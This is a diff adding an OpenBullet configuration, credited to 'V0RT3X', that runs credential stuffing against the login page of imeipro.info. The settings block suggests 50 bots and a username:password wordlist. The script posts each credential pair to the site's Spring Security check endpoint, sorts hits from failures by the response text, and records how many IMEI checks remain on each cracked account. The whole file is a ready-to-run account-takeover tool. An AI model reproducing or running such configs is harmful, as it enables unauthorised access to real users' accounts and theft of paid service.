@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "IMEI PRO || V0RT3X",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-02T11:37:06.7198539+01:00",
+  "AdditionalInfo": "",
+  "Author": "V0RT3X",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "http://www.imeipro.info/j_spring_security_check" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&submit=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You logged in successfully" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Username or Password" 
+PARSE "<SOURCE>" LR ">You have " " checks within hour<" -> CAP "Checks left this hour" 
+PARSE "<SOURCE>" LR "<span id=\"dailyChecks\" class=\"information\">" " checks left for today<" -> CAP "Checks left for today" 
